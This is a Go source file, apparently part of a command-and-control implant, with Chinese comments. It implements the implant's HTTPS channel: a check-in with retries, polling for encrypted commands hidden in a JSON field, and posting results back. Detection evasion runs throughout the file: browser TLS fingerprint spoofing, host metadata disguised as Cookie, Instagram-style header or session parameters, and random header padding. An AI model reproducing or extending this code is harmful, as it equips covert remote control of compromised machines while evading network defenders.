//go:build transport_https || transport_multi

package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"os"
	"time"

	utls "github.com/refraction-networking/utls"

	"implant/core/app"
	"implant/core/debuglog"
	"implant/core/communication"
	"implant/core/config"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
)





// NewTransport 构造 https 传输（单二进制 build tag 入口）
// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
func init() {
	registerTransport("https", newHTTPSTransport)
	listenerType = "https"
}

func newHTTPSTransport() transportClient {
	return &HTTPSClient{reconnectMgr: reconnect.NewReconnectManager()}
}

// connected 当前是否已连接
func (s *HTTPSClient) IsConnected() bool { return s.connected }

// ReconnectMgr 返回重连管理器
func (s *HTTPSClient) ReconnectMgr() *reconnect.ReconnectManager { return s.reconnectMgr }

type HTTPSClient struct {
	reconnectMgr *reconnect.ReconnectManager
	connected    bool
	getURL       string
	postURL      string
	client       *http.Client
}

func (s *HTTPSClient) fail() {
	s.connected = false
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectFailed()
	}
}

// setURLs 恒用 https:// 前缀；connect_address 为裸 host[:port]（无 scheme，见 patch 管线）。
func (s *HTTPSClient) setURLs(host string) {
	s.getURL = "https://" + host + config.HTTPGetURI()
	s.postURL = "https://" + host + config.HTTPPostURI()

	// 严格 TLS：tls.VersionTLS12+，系统根证书池校验，不设 InsecureSkipVerify。
	// 标准 CDN 前置场景由 CDN 边缘终结 TLS（证书为 CDN 域名签发），客户端校验通过；
	// 直连场景需服务端配置该域名真实证书。
	// 可选：TSHELL_HTTPS_CA=<PEM路径> 时，用该 CA 构建 RootCAs（仍严格校验，非跳过验证）。
	// 用于信任自签回源证书（CDN Full 回源）或本地测试自签监听器；未设置则用系统根库。
	tlsConfig := &tls.Config{MinVersion: tls.VersionTLS12}
	if caPath := os.Getenv("TSHELL_HTTPS_CA"); caPath != "" {
		pem, err := os.ReadFile(caPath)
		if err != nil {
			debuglog.Printf("⚠️ [HTTPS] 读取 TSHELL_HTTPS_CA 失败: %v，回退系统根库\n", err)
		} else {
			pool, err := x509.SystemCertPool()
			if err != nil || pool == nil {
				pool = x509.NewCertPool()
			}
			if !pool.AppendCertsFromPEM(pem) {
				debuglog.Printf("⚠️ [HTTPS] TSHELL_HTTPS_CA 无有效证书，回退系统根库\n")
			} else {
				tlsConfig.RootCAs = pool
				debuglog.Printf("🔐 [HTTPS] 已加载 TSHELL_HTTPS_CA 根证书\n")
			}
		}
	}
	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = tlsConfig
	// OPSEC(P2-6): uTLS ClientHello 指纹伪装（JA3 对齐主流浏览器，Profile tls.ja3 驱动），
	// 保留严格证书校验（系统根库/自定义 CA）与 TLS1.2+
	ja3 := config.TLSFingerprint()
	transport.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		var nd net.Dialer
		rawConn, err := nd.DialContext(ctx, network, addr)
		if err != nil {
			return nil, err
		}
		host, _, _ := net.SplitHostPort(addr)
		uconf := &utls.Config{
			ServerName:         host,
			RootCAs:            tlsConfig.RootCAs,
			MinVersion:         tls.VersionTLS12,
			InsecureSkipVerify: false,
		}
		uconn := utls.UClient(rawConn, uconf, ja3ID(ja3))
		if err := uconn.HandshakeContext(ctx); err != nil {
			rawConn.Close()
			return nil, err
		}
		return uconn, nil
	}
	s.client = &http.Client{Transport: transport}
}

// ja3ID uTLS 预置指纹选择（与 core/config.TLSFingerprint 返回值对应）
func ja3ID(name string) utls.ClientHelloID {
	switch name {
	case "firefox_121":
		return utls.HelloFirefox_Auto
	case "edge_120":
		return utls.HelloEdge_Auto
	case "safari_17":
		return utls.HelloSafari_Auto
	default:
		return utls.HelloChrome_Auto
	}
}

// Connect: FirstBlood（GET 直到 200）+ 设置会话密钥。
func (s *HTTPSClient) Connect(host string) error {
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectAttempt()
	}
	s.setURLs(host)
	if len(utils.MetaInfo) == 0 {
		metaRaw, metaErr := utils.EncryptedMetaInfo()
		if metaErr != nil {
			s.fail()
			return fmt.Errorf("生成 MetaInfo 失败: %v", metaErr)
		}
		metaB64, metaErr2 := encrypt.EncodeBase64(metaRaw)
		if metaErr2 != nil {
			s.fail()
			return fmt.Errorf("编码 MetaInfo 失败: %v", metaErr2)
		}
		utils.MetaInfo = metaB64
	}

	// FirstBlood: GET 直到 HTTP 200
	for attempt := 0; ; attempt++ {
		if err := s.getRaw(); err == nil {
			break
		} else {
			debuglog.Printf("❌ [HTTPS] FirstBlood GET 尝试%d 失败: %v\n", attempt, err)
		}
		if attempt >= 5 {
			s.fail()
			return fmt.Errorf("FirstBlood 失败")
		}
		time.Sleep(time.Duration(1<<uint(attempt)) * time.Second)
	}

	// 会话密钥（与服务端 https 监听器配置一致；占位符由 patch 管线替换）
	salt, masterKey := app.GetListenerKeyConfig("https")
	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
		s.fail()
		return err
	}
	s.connected = true
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectSuccess()
	}
	return nil
}

// applyMetadata 将 metadata（MetaInfo）放入随机/配置的传输通道（cookie/header/url/auto）。
func (s *HTTPSClient) applyMetadata(req *http.Request) {
	channel := config.MetadataChannel()
	if channel == "auto" {
		channel = []string{"cookie", "header", "url"}[rand.Intn(3)]
	}
	meta := httpGetMetadataPrepend + string(utils.MetaInfo)
	switch channel {
	case "header":
		req.Header.Set("X-IG-App-ID", meta)
	case "url":
		q := req.URL.Query()
		q.Set("sessionid", meta)
		req.URL.RawQuery = q.Encode()
	default:
		req.Header.Set("Cookie", meta)
	}
}

// applyRequestPadding 流量填充：随机附加请求头，破除请求头长度指纹。
func (s *HTTPSClient) applyRequestPadding(req *http.Request) {
	if !config.PaddingEnabled() {
		return
	}
	padLen := 32 + rand.Intn(96)
	pad := make([]byte, padLen)
	const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._~"
	for i := range pad {
		pad[i] = alphabet[rand.Intn(len(alphabet))]
	}
	req.Header.Set("X-Client-Data", string(pad))
}

// getRaw 发起一次 GET，仅用于 FirstBlood 探测（检查 200）。
func (s *HTTPSClient) getRaw() error {
	req, err := http.NewRequest("GET", s.getURL, nil)
	req.Header.Set("User-Agent", config.UserAgent())
if err != nil {
		return err
	}
	s.applyMetadata(req)
	s.applyRequestPadding(req)
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	return nil
}

// Recv: GET 拉取命令，解析 JSON pos_2，解密返回。无命令返回 nil。
func (s *HTTPSClient) Recv() ([]byte, error) {
	req, err := http.NewRequest("GET", s.getURL, nil)
	req.Header.Set("User-Agent", config.UserAgent())
if err != nil {
		return nil, err
	}
	s.applyMetadata(req)
	s.applyRequestPadding(req)
	resp, err := s.client.Do(req)
	if err != nil {
		s.fail()
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		s.fail()
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	// 服务端 action_rule.pos_2 为 []byte（base64(encryptedCmd)），JSON marshal 再套一层 base64。
	// 反序列化到 []byte 会自动解开外层 base64，得到 base64(encryptedCmd)。
	var respJSON struct {
		Data struct {
			ActionRule struct {
				Pos2 []byte `json:"pos_2"`
			} `json:"action_rule"`
		} `json:"data"`
	}
	if err := json.Unmarshal(body, &respJSON); err != nil {
		return nil, err
	}
	pos2 := respJSON.Data.ActionRule.Pos2
	if len(pos2) == 0 {
		return nil, nil // 无命令
	}
	rawData, err := encrypt.DecodeBase64(pos2) // 解开内层 base64 -> encryptedCmd
	if err != nil {
		return nil, err
	}
	decrypted, err := communication.DecryptCommand(rawData)
	if err != nil {
		return nil, err
	}
	// 【会话密钥唯一化】消费服务端下发的 nonce 协商消息（type=4）
	return communication.ConsumeSessionNonce(decrypted)
}

// SendResult: POST body=b64Packet + Cookie。HTTPS 协议不加 MetaInfo 分帧（服务端直接读 body）。
func (s *HTTPSClient) SendResult(b64Packet []byte) error {
	req, err := http.NewRequest("POST", s.postURL, strings.NewReader(string(b64Packet)))
	req.Header.Set("User-Agent", config.UserAgent())
if err != nil {
		return err
	}
	s.applyMetadata(req)
	s.applyRequestPadding(req)
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return nil
}

func (s *HTTPSClient) Close() error { return nil }

// PollInterval 轮询型传输：空闲轮询间隔 = sleep 基准（理由同 HTTPClient，见 transport_http.go）。
func (c *HTTPSClient) PollInterval() time.Duration { return config.WaitTime }
